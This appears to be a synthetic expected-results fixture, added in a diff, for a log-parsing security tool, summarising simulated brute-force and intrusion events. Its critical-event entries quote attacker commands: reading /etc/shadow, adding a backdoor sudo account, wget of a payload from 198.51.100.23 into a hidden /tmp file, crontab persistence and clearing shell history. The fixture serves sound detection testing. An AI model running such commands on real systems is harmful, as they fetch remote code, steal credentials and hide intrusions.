@@ -1,0 +1,577 @@
+{
+  "synthetic": true,
+  "generatedWith": "src/public/js/parser.js (project parser) - parseLog() + correlate() + summarize()",
+  "importSettings": {
+    "yearForSyslogTimestamps": 2026,
+    "timezone": "UTC"
+  },
+  "perFile": {
+    "auth.log": {
+      "events": 22,
+      "bySeverity": {
+        "critical": 1,
+        "high": 10,
+        "medium": 3,
+        "low": 1,
+        "info": 7
+      },
+      "byType": {
+        "successful_login": 2,
+        "session_opened": 2,
+        "disconnect": 3,
+        "session_closed": 2,
+        "recon": 1,
+        "invalid_user": 3,
+        "failed_login": 9
+      },
+      "failedLogins": 12,
+      "indicatorTags": {
+        "external-ip": 18,
+        "brute-force-pattern": 10,
+        "login-after-failures": 1
+      },
+      "firstEventUtc": "2026-10-28T08:01:12.000Z",
+      "lastEventUtc": "2026-10-28T14:15:00.000Z",
+      "topSourceIps": [
+        {
+          "ip": "203.0.113.45",
+          "count": 12
+        },
+        {
+          "ip": "198.51.100.77",
+          "count": 4
+        },
+        {
+          "ip": "192.0.2.10",
+          "count": 2
+        }
+      ],
+      "rejectedLines": 0,
+      "skippedCommentOrBlankLines": 7
+    },
+    "syslog.log": {
+      "events": 17,
+      "bySeverity": {
+        "critical": 0,
+        "high": 0,
+        "medium": 0,
+        "low": 0,
+        "info": 17
+      },
+      "byType": {
+        "other": 17
+      },
+      "failedLogins": 0,
+      "indicatorTags": {},
+      "firstEventUtc": "2026-10-28T13:50:00.120Z",
+      "lastEventUtc": "2026-10-28T14:30:00.000Z",
+      "topSourceIps": [],
+      "rejectedLines": 0,
+      "skippedCommentOrBlankLines": 7
+    },
+    "sample-access.log": {
+      "events": 19,
+      "bySeverity": {
+        "critical": 0,
+        "high": 0,
+        "medium": 0,
+        "low": 0,
+        "info": 19
+      },
+      "byType": {
+        "other": 19
+      },
+      "failedLogins": 0,
+      "indicatorTags": {},
+      "firstEventUtc": "2026-10-28T13:40:02.000Z",
+      "lastEventUtc": "2026-10-28T14:13:06.000Z",
+      "topSourceIps": [],
+      "rejectedLines": 0,
+      "skippedCommentOrBlankLines": 8
+    },
+    "failed-logins.log": {
+      "events": 34,
+      "bySeverity": {
+        "critical": 0,
+        "high": 29,
+        "medium": 4,
+        "low": 1,
+        "info": 0
+      },
+      "byType": {
+        "failed_login": 21,
+        "invalid_user": 12,
+        "auth_failure": 1
+      },
+      "failedLogins": 33,
+      "indicatorTags": {
+        "external-ip": 34,
+        "brute-force-pattern": 29
+      },
+      "firstEventUtc": "2026-10-28T02:00:07.000Z",
+      "lastEventUtc": "2026-10-28T03:50:12.000Z",
+      "topSourceIps": [
+        {
+          "ip": "203.0.113.80",
+          "count": 30
+        },
+        {
+          "ip": "198.51.100.140",
+          "count": 3
+        },
+        {
+          "ip": "192.0.2.30",
+          "count": 1
+        }
+      ],
+      "rejectedLines": 0,
+      "skippedCommentOrBlankLines": 7
+    },
+    "suspicious-activity.log": {
+      "events": 17,
+      "bySeverity": {
+        "critical": 8,
+        "high": 3,
+        "medium": 3,
+        "low": 1,
+        "info": 2
+      },
+      "byType": {
+        "sudo_failure": 1,
+        "privilege_escalation": 7,
+        "account_change": 3,
+        "account_created": 1,
+        "credential_change": 1,
+        "su_failure": 1,
+        "successful_login": 1,
+        "session_opened": 1,
+        "disconnect": 1
+      },
+      "failedLogins": 0,
+      "indicatorTags": {
+        "sensitive-command": 6,
+        "privileged-group": 2,
+        "external-ip": 2
+      },
+      "firstEventUtc": "2026-10-28T14:10:02.000Z",
+      "lastEventUtc": "2026-10-28T14:24:47.000Z",
+      "topSourceIps": [
+        {
+          "ip": "203.0.113.45",
+          "count": 2
+        }
+      ],
+      "rejectedLines": 0,
+      "skippedCommentOrBlankLines": 7
+    },
+    "normal-activity.log": {
+      "events": 21,
+      "bySeverity": {
+        "critical": 0,
+        "high": 0,
+        "medium": 4,
+        "low": 4,
+        "info": 13
+      },
+      "byType": {
+        "successful_login": 3,
+        "session_opened": 6,
+        "privilege_escalation": 3,
+        "session_closed": 5,
+        "disconnect": 3,
+        "credential_change": 1
+      },
+      "failedLogins": 0,
+      "indicatorTags": {
+        "external-ip": 6
+      },
+      "firstEventUtc": "2026-10-27T08:00:41.000Z",
+      "lastEventUtc": "2026-10-27T17:55:01.000Z",
+      "topSourceIps": [
+        {
+          "ip": "192.0.2.11",
+          "count": 4
+        },
+        {
+          "ip": "192.0.2.10",
+          "count": 2
+        }
+      ],
+      "rejectedLines": 0,
+      "skippedCommentOrBlankLines": 7
+    },
+    "malformed-sample.log": {
+      "events": 2,
+      "bySeverity": {
+        "critical": 0,
+        "high": 0,
+        "medium": 1,
+        "low": 1,
+        "info": 0
+      },
+      "byType": {
+        "failed_login": 1,
+        "successful_login": 1
+      },
+      "failedLogins": 1,
+      "indicatorTags": {
+        "external-ip": 2
+      },
+      "firstEventUtc": "2026-10-28T10:00:00.000Z",
+      "lastEventUtc": "2026-10-28T10:00:09.000Z",
+      "topSourceIps": [
+        {
+          "ip": "203.0.113.99",
+          "count": 1
+        },
+        {
+          "ip": "192.0.2.10",
+          "count": 1
+        }
+      ],
+      "rejectedLines": 10,
+      "skippedCommentOrBlankLines": 8,
+      "rejectionReasons": [
+        {
+          "line": 9,
+          "reason": "Unrecognised log format (expected syslog or ISO timestamp header)"
+        },
+        {
+          "line": 10,
+          "reason": "Unknown month \"Foo\""
+        },
+        {
+          "line": 11,
+          "reason": "Invalid date/time values"
+        },
+        {
+          "line": 12,
+          "reason": "Invalid date/time values"
+        },
+        {
+          "line": 13,
+          "reason": "Invalid ISO timestamp"
+        },
+        {
+          "line": 14,
+          "reason": "Contains binary/control characters"
+        },
+        {
+          "line": 15,
+          "reason": "Line exceeds 4096 characters"
+        },
+        {
+          "line": 16,
+          "reason": "Unrecognised log format (expected syslog or ISO timestamp header)"
+        },
+        {
+          "line": 17,
+          "reason": "Unrecognised log format (expected syslog or ISO timestamp header)"
+        },
+        {
+          "line": 18,
+          "reason": "Unrecognised log format (expected syslog or ISO timestamp header)"
+        }
+      ]
+    }
+  },
+  "scenarios": {
+    "fullIncident": {
+      "description": "Import auth.log, suspicious-activity.log, syslog.log and sample-access.log together (tick \"Append\" for each after the first).",
+      "files": [
+        "auth.log",
+        "suspicious-activity.log",
+        "syslog.log",
+        "sample-access.log"
+      ],
+      "events": 75,
+      "bySeverity": {
+        "critical": 10,
+        "high": 13,
+        "medium": 6,
+        "low": 1,
+        "info": 45
+      },
+      "byType": {
+        "successful_login": 3,
+        "session_opened": 3,
+        "disconnect": 4,
+        "session_closed": 2,
+        "other": 36,
+        "recon": 1,
+        "invalid_user": 3,
+        "failed_login": 9,
+        "sudo_failure": 1,
+        "privilege_escalation": 7,
+        "account_change": 3,
+        "account_created": 1,
+        "credential_change": 1,
+        "su_failure": 1
+      },
+      "failedLogins": 12,
+      "indicatorTags": {
+        "external-ip": 20,
+        "brute-force-pattern": 10,
+        "login-after-failures": 2,
+        "sensitive-command": 6,
+        "privileged-group": 2
+      },
+      "firstEventUtc": "2026-10-28T08:01:12.000Z",
+      "lastEventUtc": "2026-10-28T14:30:00.000Z",
+      "topSourceIps": [
+        {
+          "ip": "203.0.113.45",
+          "count": 14
+        },
+        {
+          "ip": "198.51.100.77",
+          "count": 4
+        },
+        {
+          "ip": "192.0.2.10",
+          "count": 2
+        }
+      ],
+      "keyCorrelations": {
+        "bruteForceSourceIp": "203.0.113.45",
+        "compromisedLogin": [
+          {
+            "timestampUtc": "2026-10-28T14:09:15.000Z",
+            "source": "auth.log",
+            "line": 25,
+            "type": "successful_login",
+            "severity": "critical",
+            "user": "webadmin",
+            "ip": "203.0.113.45",
+            "tags": [
+              "external-ip",
+              "login-after-failures"
+            ],
+            "description": "Successful login for webadmin via password — after 10 failed attempts from this IP"
+          },
+          {
+            "timestampUtc": "2026-10-28T14:20:33.000Z",
+            "source": "suspicious-activity.log",
+            "line": 20,
+            "type": "successful_login",
+            "severity": "critical",
+            "user": "svc-backup",
+            "ip": "203.0.113.45",
+            "tags": [
+              "external-ip",
+              "login-after-failures"
+            ],
+            "description": "Successful login for svc-backup via password — after 10 failed attempts from this IP"
+          }
+        ],
+        "criticalEvents": [
+          {
+            "timestampUtc": "2026-10-28T14:09:15.000Z",
+            "source": "auth.log",
+            "line": 25,
+            "type": "successful_login",
+            "severity": "critical",
+            "user": "webadmin",
+            "ip": "203.0.113.45",
+            "tags": [
+              "external-ip",
+              "login-after-failures"
+            ],
+            "description": "Successful login for webadmin via password — after 10 failed attempts from this IP"
+          },
+          {
+            "timestampUtc": "2026-10-28T14:11:05.000Z",
+            "source": "suspicious-activity.log",
+            "line": 9,
+            "type": "privilege_escalation",
+            "severity": "critical",
+            "user": "webadmin",
+            "ip": null,
+            "tags": [
+              "sensitive-command"
+            ],
+            "description": "sudo as root by webadmin: /usr/bin/cat /etc/shadow"
+          },
+          {
+            "timestampUtc": "2026-10-28T14:12:10.000Z",
+            "source": "suspicious-activity.log",
+            "line": 10,
+            "type": "privilege_escalation",
+            "severity": "critical",
+            "user": "webadmin",
+            "ip": null,
+            "tags": [
+              "sensitive-command"
+            ],
+            "description": "sudo as root by webadmin: /usr/sbin/useradd -m -s /bin/bash svc-backup"
+          },
+          {
+            "timestampUtc": "2026-10-28T14:12:30.000Z",
+            "source": "suspicious-activity.log",
+            "line": 13,
+            "type": "privilege_escalation",
+            "severity": "critical",
+            "user": "webadmin",
+            "ip": null,
+            "tags": [
+              "sensitive-command"
+            ],
+            "description": "sudo as root by webadmin: /usr/sbin/usermod -aG sudo svc-backup"
+          },
+          {
+            "timestampUtc": "2026-10-28T14:12:30.000Z",
+            "source": "suspicious-activity.log",
+            "line": 14,
+            "type": "account_change",
+            "severity": "critical",
+            "user": "svc-backup",
+            "ip": null,
+            "tags": [
+              "privileged-group"
+            ],
+            "description": "User svc-backup added to group 'sudo' (privileged group)"
+          },
+          {
+            "timestampUtc": "2026-10-28T14:12:30.000Z",
+            "source": "suspicious-activity.log",
+            "line": 15,
+            "type": "account_change",
+            "severity": "critical",
+            "user": "svc-backup",
+            "ip": null,
+            "tags": [
+              "privileged-group"
+            ],
+            "description": "User svc-backup added to group 'sudo' (privileged group)"
+          },
+          {
+            "timestampUtc": "2026-10-28T14:13:05.000Z",
+            "source": "suspicious-activity.log",
+            "line": 17,
+            "type": "privilege_escalation",
+            "severity": "critical",
+            "user": "webadmin",
+            "ip": null,
+            "tags": [
+              "sensitive-command"
+            ],
+            "description": "sudo as root by webadmin: /usr/bin/wget http://198.51.100.23/payload.sh -O /tmp/.cache.sh"
+          },
+          {
+            "timestampUtc": "2026-10-28T14:13:40.000Z",
+            "source": "suspicious-activity.log",
+            "line": 18,
+            "type": "privilege_escalation",
+            "severity": "critical",
+            "user": "webadmin",
+            "ip": null,
+            "tags": [
+              "sensitive-command"
+            ],
+            "description": "sudo as root by webadmin: /usr/bin/crontab -e"
+          },
+          {
+            "timestampUtc": "2026-10-28T14:20:33.000Z",
+            "source": "suspicious-activity.log",
+            "line": 20,
+            "type": "successful_login",
+            "severity": "critical",
+            "user": "svc-backup",
+            "ip": "203.0.113.45",
+            "tags": [
+              "external-ip",
+              "login-after-failures"
+            ],
+            "description": "Successful login for svc-backup via password — after 10 failed attempts from this IP"
+          },
+          {
+            "timestampUtc": "2026-10-28T14:21:02.000Z",
+            "source": "suspicious-activity.log",
+            "line": 22,
+            "type": "privilege_escalation",
+            "severity": "critical",
+            "user": "svc-backup",
+            "ip": null,
+            "tags": [
+              "sensitive-command"
+            ],
+            "description": "sudo as root by svc-backup: /usr/bin/history -c"
+          }
+        ],
+        "timezoneNormalisation": [
+          {
+            "timestampUtc": "2026-10-28T14:16:12.000Z",
+            "source": "syslog.log",
+            "line": 20,
+            "type": "other",
+            "severity": "info",
+            "user": null,
+            "ip": null,
+            "tags": [],
+            "description": "NOTICE [sshd] Ban 203.0.113.45"
+          }
+        ]
+      }
+    },
+    "allValidFiles": {
+      "description": "All six valid .log files imported together (malformed-sample.log excluded).",
+      "events": 130,
+      "bySeverity": {
+        "critical": 10,
+        "high": 42,
+        "medium": 14,
+        "low": 6,
+        "info": 58
+      },
+      "byType": {
+        "successful_login": 6,
+        "session_opened": 9,
+        "privilege_escalation": 10,
+        "session_closed": 7,
+        "disconnect": 7,
+        "credential_change": 2,
+        "failed_login": 30,
+        "invalid_user": 15,
+        "auth_failure": 1,
+        "other": 36,
+        "recon": 1,
+        "sudo_failure": 1,
+        "account_change": 3,
+        "account_created": 1,
+        "su_failure": 1
+      },
+      "failedLogins": 45,
+      "indicatorTags": {
+        "external-ip": 60,
+        "brute-force-pattern": 39,
+        "login-after-failures": 2,
+        "sensitive-command": 6,
+        "privileged-group": 2
+      },
+      "firstEventUtc": "2026-10-27T08:00:41.000Z",
+      "lastEventUtc": "2026-10-28T14:30:00.000Z",
+      "topSourceIps": [
+        {
+          "ip": "203.0.113.80",
+          "count": 30
+        },
+        {
+          "ip": "203.0.113.45",
+          "count": 14
+        },
+        {
+          "ip": "192.0.2.10",
+          "count": 4
+        },
+        {
+          "ip": "192.0.2.11",
+          "count": 4
+        },
+        {
+          "ip": "198.51.100.77",
+          "count": 4
+        }
+      ]
+    }
+  }
+}
